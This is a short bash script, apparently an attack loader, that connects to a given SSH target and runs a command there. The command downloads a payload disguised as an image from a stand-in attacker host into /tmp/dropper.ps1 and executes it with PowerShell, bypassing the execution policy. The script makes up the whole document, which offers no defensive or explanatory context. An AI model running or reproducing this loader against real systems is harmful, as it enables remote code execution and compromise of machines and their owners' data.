#!/bin/bash
# Example: ./termius_ssh_loader.sh user@host

SSH_TARGET=$1
PAYLOAD_URL="http://attacker.localhost/nsfw.png"

ssh $SSH_TARGET "curl -s $PAYLOAD_URL -o /tmp/dropper.ps1 && powershell -ExecutionPolicy Bypass -File /tmp/dropper.ps1"
